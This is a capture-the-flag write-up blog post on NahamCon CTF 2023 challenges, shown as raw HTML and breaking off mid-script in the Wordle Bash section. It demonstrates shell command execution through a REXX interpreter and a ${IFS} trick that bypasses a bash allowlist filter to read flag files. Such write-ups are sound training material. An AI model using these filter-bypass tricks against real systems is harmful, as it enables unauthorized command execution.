<!DOCTYPE html>
<html lang="en-us"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">NahamConCTF_2023 | Spencer&#39;s blog</title>
<meta property="og:title" content="NahamConCTF_2023 | Spencer&#39;s blog" />
<meta name="twitter:title" content="NahamConCTF_2023 | Spencer&#39;s blog" />
<meta itemprop="name" content="NahamConCTF_2023 | Spencer&#39;s blog" />
<meta name="application-name" content="NahamConCTF_2023 | Spencer&#39;s blog" />
<meta property="og:site_name" content="Awesome hugo blog" />

<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />

<meta property="og:locale" content="en-us" />
<meta name="language" content="en-us" />



  <meta itemprop="image" content="https://spencerja.github.io/" />
  <meta property="og:image" content="https://spencerja.github.io/" />
  <meta name="twitter:image" content="https://spencerja.github.io/" />
  <meta name="twitter:image:src" content="https://spencerja.github.io/" />




    
    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-06-20T20:41:32-0500 />
    <meta property="article:published_time" content=2023-06-20T20:41:32-0500 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "NahamConCTF_2023",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-06-20",
        "description": "",
        "wordCount":  5828 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-06-20",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "Spencer\u0027s blog"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.112.3">

    

    <link rel="canonical" href="https://spencerja.github.io/posts/nahamconctf_2023/">
    <link href="/style.min.9fd18eb5ac0fcc46f9be43e845311f6c6928d9bb568c6d278dae045f7b3fa666.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://spencerja.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#b40056">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    </head>
<body data-theme = "auto" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://spencerja.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/awards/">
                        Trophy Room
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page=content-top" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">NahamConCTF_2023</h1>
                
                <div class="post-meta">
                    <time datetime="2023-06-20T20:41:32-05:00" itemprop="datePublished"> Jun 20, 2023 </time>
                </div>
            </header>
            <nav class="toc">
		    <h3>Table of Contents</h3>
                <nav id="TableOfContents">
  <ul>
    <li><a href="#warmup">Warmup</a>
      <ul>
        <li><a href="#fast-hands">Fast Hands</a></li>
        <li><a href="#glasses">Glasses</a></li>
        <li><a href="#regina">Regina</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#goose-chase">Goose Chase</a></li>
        <li><a href="#one-zero">One Zero</a></li>
        <li><a href="#wordle-bash">Wordle Bash</a></li>
        <li><a href="#zombie">Zombie</a></li>
      </ul>
    </li>
    <li><a href="#osint">OSINT</a>
      <ul>
        <li><a href="#chall1">Chall1</a></li>
        <li><a href="#chall2">Chall2</a></li>
        <li><a href="#chall3">Chall3</a></li>
        <li><a href="#chall4">Chall4</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#hidden-figures">Hidden Figures</a></li>
        <li><a href="#marmalade-5">Marmalade 5</a></li>
        <li><a href="#obligatory">Obligatory</a></li>
        <li><a href="#star-wars">Star Wars</a></li>
        <li><a href="#stickers">Stickers</a></li>
      </ul>
    </li>
  </ul>
</nav>
            </nav><div class="page-content">
                <h2 id="warmup">Warmup</h2>
<h3 id="fast-hands">Fast Hands</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>You can capture the flag, but you gotta be fast!</p>
</blockquote>
<hr>
<p>We are given a button to Capture The Flag:</p>
<p><img src="images/20230616141050.png" alt="Pasted image 20230616141050.png"></p>
<p>Clicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a <code>curl</code> request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url.
I decided to see how this action is behaving when redirected through burp:</p>
<p><img src="images/20230616141445.png" alt="Pasted image 20230616141445.png"></p>
<p>Interception does indeed work great. We can see on click, we are redirected to /capture_the_flag.html.</p>
<p>When we manually follow the link:</p>
<p><img src="images/20230616141617.png" alt="Pasted image 20230616141617.png"></p>
<p>It&rsquo;s another button, but doesn&rsquo;t appear to be working too well. Viewing page source with Ctrl+U, we can see the flag within the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container p-5&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;text-center mt-5 p-5&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;ctf()&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-success&#34;</span><span class="p">&gt;&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Your flag is:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display:none&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">                  flag{80176cdf1547a9be54862df3568966b8}
</span></span><span class="line"><span class="cl">                <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>flag{80176cdf1547a9be54862df3568966b8}</code></p>
<p>Alternatively, we could have curled <a href="http://challenge.nahamcon.com:31565/capture_the_flag.html">http://challenge.nahamcon.com:31565/capture_the_flag.html</a> to achieve the same results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl -s http://challenge.nahamcon.com:31565/capture_the_flag.html <span class="p">|</span> grep flag
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                &lt;button <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;button&#34;</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">&#34;ctf()&#34;</span> <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;btn btn-success&#34;</span>&gt;&lt;h1&gt;Your flag is:&lt;br&gt;
</span></span><span class="line"><span class="cl">                  flag<span class="o">{</span>80176cdf1547a9be54862df3568966b8<span class="o">}</span>
</span></span></code></pre></div><h3 id="glasses">Glasses</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>Everything is blurry, I think I need glasses!</p>
</blockquote>
<hr>
<p>Visiting the page gives us a very non-interactive page where we might buy glasses.
Checking the source code with ctrl+U is an absolute mess. However, since everything I interact with does not take me anywhere new, I want to view html code on the page. Using right click to inspect has an interesting interaction:</p>
<p><img src="images/20230615234612.png" alt="Pasted image 20230615234612.png"></p>
<p>What&rsquo;s even more interesting is this does nothing. I still get to inspect anyways.</p>
<p>After leafing through the code a little bit, I do indeed find a piece that is interesting:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lead&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Can&#39;t see things because they are too blurry? Is your vision foggy, and everything looks like
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">em</span><span class="p">&gt;</span>this?<span class="p">&lt;/</span><span class="nt">em</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: transparent;text-shadow: 0 0 5px rgba(0,0,0,0.09);text-decoration: line-through;&#34;</span><span class="p">&gt;</span>flag½₧8084e4530cf649814456f2a291eb81e9½―<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Test your vision with glasses! Try on this pair and see if you can see the previous sample text... you might find a lot of value! Imagine the world where you can see clearly!
</span></span></code></pre></div><p>Here is the same selection displayed on the webpage:</p>
<p><img src="images/20230615234853.png" alt="Pasted image 20230615234853.png"></p>
<p>The color of our flag is transparent on top of white, and perhaps might be microscopically tiny as well. Either way, it is evident once we inspect the properties on the page.
<code>flag{8084e4530cf649814456f2a291eb81e9}</code></p>
<h3 id="regina">Regina</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>I have a tyrannosaurus rex plushie and I named it Regina! Here, you can talk to it :)</p>
</blockquote>
<hr>
<p>Entering the challenge, we are greeted with a banner:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span></code></pre></div><p>A quick google search shows this is a rather popular interpreter that I have never heard of. It has a very thorough man page located <a href="https://master.dl.sourceforge.net/project/regina-rexx/regina-documentation/3.9.4/regina.pdf?viasf=1">here</a>. However, no matter what my input is, I cannot seem to get a response. I learned the proper syntax that should work for testing purposes, but nothing connects back:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span><span class="line"><span class="cl">Say <span class="s2">&#34;Test&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">client_loop: send disconnect: Broken pipe
</span></span></code></pre></div><p>After trying things for quite a while, right before giving up, I miraculously stumbled upon a response somehow:</p>
<pre tabindex="0"><code>/usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit)
&#39;say test&#39;
;
run
&#39;say test&#39;;
Say &#34;Test&#34;;
exec
run
;
go
^F
mysh: say: not found
 
^Fmy
my
sh: RUN: not found

sh: say: not found
Test
 
sh: EXEC: not found

sh: RUN: not found
Ssh: GO: not found
Connection to challenge.nahamcon.com closed.
</code></pre><p>While just enough to keep me from giving up, I had a lot of trouble recreating this still. While I had pressed ^F in the cli, I was under the impression that I also had pressed ^D and this keystroke was important for the execution. However, simply pressing ^D on its own ended up terminating the <code>ssh</code> connection.</p>
<p>Eventually I landed on a goofy pattern to execute, where I write my commands, quickly press the <code>enter</code> key two times, immediately followed by ^D, then another <code>enter</code> stroke. With this, my commands would be executed and then the connection terminated.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span><span class="line"><span class="cl">ADDRESS SYSTEM <span class="s2">&#34;ls&#34;</span>
</span></span><span class="line"><span class="cl">Say <span class="s2">&#34;Test&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">flag.txt
</span></span><span class="line"><span class="cl">Test
</span></span><span class="line"><span class="cl">Connection to challenge.nahamcon.com closed.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/local/bin/regina: REXX-Regina_3.9.4<span class="o">(</span>MT<span class="o">)</span> 5.00 <span class="m">25</span> Oct <span class="m">2021</span> <span class="o">(</span><span class="m">64</span> bit<span class="o">)</span>
</span></span><span class="line"><span class="cl">ADDRESS SYSTEM <span class="s2">&#34;cat flag.txt&#34;</span>
</span></span><span class="line"><span class="cl">Say <span class="s2">&#34;Test&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>2459b9ae7c704979948318cd2f47dfd6<span class="o">}</span>
</span></span><span class="line"><span class="cl">Test
</span></span><span class="line"><span class="cl">Connection to challenge.nahamcon.com closed.
</span></span></code></pre></div><p>CTRL+D is commonly used for exiting programs, so it is somewhat sensible that it finalizes REXX-Regina for execution. Was this intended, though? It certainly felt like a strange way to interact.</p>
<h2 id="misc">Misc</h2>
<hr>
<h3 id="goose-chase">Goose Chase</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>I am truly sorry. I really do apologize&hellip; I <em>hope</em> you can bear with me as I set you all loose together, on a communal collaboriative <em>wild goose chase</em>.</p>
</blockquote>
<hr>
<p>Within the google sheet, we see a hidden sheet if we check the bottom left:</p>
<p><img src="images/20230615161723.png" alt="Pasted image 20230615161723.png"></p>
<p>It seems there is no way to view this as long as it is owned by somebody else, but it is possible to clone it into my own google sheet:</p>
<p><img src="images/20230615161942.png" alt="Pasted image 20230615161942.png"></p>
<p>Under our copied version, we can make the hidden sheet viewable. Within the hidden sheet seems to be a formula importing from another sheet, only viewable after turning on formulas (<code>View</code> -&gt; <code>Show</code> -&gt; <code>Formulas</code>).</p>
<p><img src="images/20230615162221.png" alt="Pasted image 20230615162221.png"></p>
<p>Following this page again looks like an empty sheet. Just to be sure, i exported the sheet to a csv. Without editing the saved file, I learned that the flag was present in the file name:</p>
<pre tabindex="0"><code>Goose Chase - Google Sheets - ... - Google Sheets - ... flag{323264294cc2a4ebb2c8d5f9e0afb0f7} - Google Sheets - Goose Chase.csv
</code></pre><p>It isn&rsquo;t obvious until I had exported, but it appears the flag was buried deep within the title name of the second sheet project. This can be verified using browser view, the flag is also present on hovering over the window:</p>
<p><img src="images/20230615162731.png" alt="Pasted image 20230615162731.png"></p>
<p><code>flag{323264294cc2a4ebb2c8d5f9e0afb0f7}</code></p>
<h3 id="one-zero">One Zero</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>You only get one zero. ;)</p>
</blockquote>
<hr>
<p><em>NOTE</em>, <em>This solution utilizes an unintended interaction</em>.</p>
<p>We are given a file to see the restrictions placed. Once we are ready to give it a try, we ssh to their designated port.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">shopt</span> -s extdebug
</span></span><span class="line"><span class="cl"><span class="k">function</span> one_zero<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$BASH_COMMAND</span><span class="s2">&#34;</span> <span class="o">=</span>~ ^<span class="o">[</span><span class="se">\$\&amp;</span>+:<span class="se">\;</span><span class="o">=</span><span class="se">\?</span>@<span class="se">\#</span><span class="p">|</span><span class="se">\&lt;\&gt;</span>.<span class="se">\^\*</span><span class="o">()</span><span class="se">\%\!</span>0-<span class="o">]</span>+ <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nv">num_zero</span><span class="o">=</span><span class="k">$(</span>awk <span class="s1">&#39;{print gsub(/0/, &#34;&#34;)}&#39;</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">&#34;</span><span class="nv">$BASH_COMMAND</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$num_zero</span> -le <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> <span class="s2">&#34;You are only allowed one zero. :)&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> 1<span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Sorry, you used a character that is not in the allowlist!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> 1<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">trap</span> <span class="s1">&#39;one_zero&#39;</span> DEBUG
</span></span></code></pre></div><p>We can see there is a very strict character on the allowlist, but also that more than 1 zero and we trip the 2nd if statement, telling us only 1 zero allowed.</p>
<p>Jumping right in I learned that we can still pass env variables:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ <span class="nv">$TERM</span>
</span></span><span class="line"><span class="cl">bash: xterm-256color: <span class="nb">command</span> not found
</span></span><span class="line"><span class="cl">user@one_zero:~$ <span class="nv">$HOME</span>
</span></span><span class="line"><span class="cl">bash: /home/user: Is a directory
</span></span></code></pre></div><p>In these cases, I don&rsquo;t even need my precious zero! But what to do with them? The answer is not so clear.
Next I found that I can append letter characters after a zero, and I still bypass the allowlist:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ 0whoami
</span></span><span class="line"><span class="cl">bash: 0whoami: <span class="nb">command</span> not found
</span></span></code></pre></div><p>So far nothing is workable. After attempting some other additional operators:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ 0<span class="o">||</span>whoami
</span></span><span class="line"><span class="cl">bash: 0: <span class="nb">command</span> not found
</span></span><span class="line"><span class="cl">Sorry, you used a character that is not in the allowlist!
</span></span></code></pre></div><p>My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.</p>
<p>I know the bash special variable <code>$IFS</code> is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ <span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>whoami
</span></span><span class="line"><span class="cl">user
</span></span><span class="line"><span class="cl">user@one_zero:~$ <span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>ls
</span></span><span class="line"><span class="cl">flag.txt
</span></span></code></pre></div><p>In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter!
From here it&rsquo;s a simple <code>cat</code> away:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@one_zero:~$ <span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>cat flag.txt
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>81b9de37f5bd218c9f59ac2d9d709bf6<span class="o">}</span>
</span></span></code></pre></div><h3 id="wordle-bash">Wordle Bash</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>We put a new novel spin on the old classic game of Wordle! Now it&rsquo;s written in bash! :D</p>
<p>Oh, and you aren&rsquo;t guessing words, this time&hellip;</p>
</blockquote>
<hr>
<p>Upon ssh, we find the wordle challenge. It&rsquo;s umpiled shell code, so firstly let&rsquo;s take a look:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">YEARS</span><span class="o">=(</span><span class="s2">&#34;2020&#34;</span> <span class="s2">&#34;2021&#34;</span> <span class="s2">&#34;2022&#34;</span> <span class="s2">&#34;2023&#34;</span> <span class="s2">&#34;2024&#34;</span> <span class="s2">&#34;2025&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">MONTHS</span><span class="o">=(</span><span class="s2">&#34;01&#34;</span> <span class="s2">&#34;02&#34;</span> <span class="s2">&#34;03&#34;</span> <span class="s2">&#34;04&#34;</span> <span class="s2">&#34;05&#34;</span> <span class="s2">&#34;06&#34;</span> <span class="s2">&#34;07&#34;</span> <span class="s2">&#34;08&#34;</span> <span class="s2">&#34;09&#34;</span> <span class="s2">&#34;10&#34;</span> <span class="s2">&#34;11&#34;</span> <span class="s2">&#34;12&#34;</span> <span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">DAYS</span><span class="o">=(</span><span class="s2">&#34;01&#34;</span> <span class="s2">&#34;02&#34;</span> <span class="s2">&#34;03&#34;</span> <span class="s2">&#34;04&#34;</span> <span class="s2">&#34;05&#34;</span> <span class="s2">&#34;06&#34;</span> <span class="s2">&#34;07&#34;</span> <span class="s2">&#34;08&#34;</span> <span class="s2">&#34;09&#34;</span> <span class="s2">&#34;10&#34;</span> <span class="s2">&#34;11&#34;</span> <span class="s2">&#34;12&#34;</span> <span class="s2">&#34;13&#34;</span> <span class="s2">&#34;14&#34;</span> <span class="s2">&#34;15&#34;</span> <span class="s2">&#34;16&#34;</span> <span class="s2">&#34;17&#34;</span> <span class="s2">&#34;18&#34;</span> <span class="s2">&#34;19&#34;</span> <span class="s2">&#34;20&#34;</span> <span class="s2">&#34;21&#34;</span> <span class="s2">&#34;22&#34;</span> <span class="s2">&#34;23&#34;</span> <span class="s2">&#34;24&#34;</span> <span class="s2">&#34;25&#34;</span> <span class="s2">&#34;26&#34;</span> <span class="s2">&#34;27&#34;</span> <span class="s2">&#34;28&#34;</span> <span class="s2">&#34;29&#34;</span> <span class="s2">&#34;30&#34;</span> <span class="s2">&#34;31&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">YEARS_SIZE</span><span class="o">=</span><span class="si">${#</span><span class="nv">YEARS</span><span class="p">[@]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">YEARS_INDEX</span><span class="o">=</span><span class="k">$((</span><span class="nv">$RANDOM</span> <span class="o">%</span> <span class="nv">$YEARS_SIZE</span><span class="k">))</span>
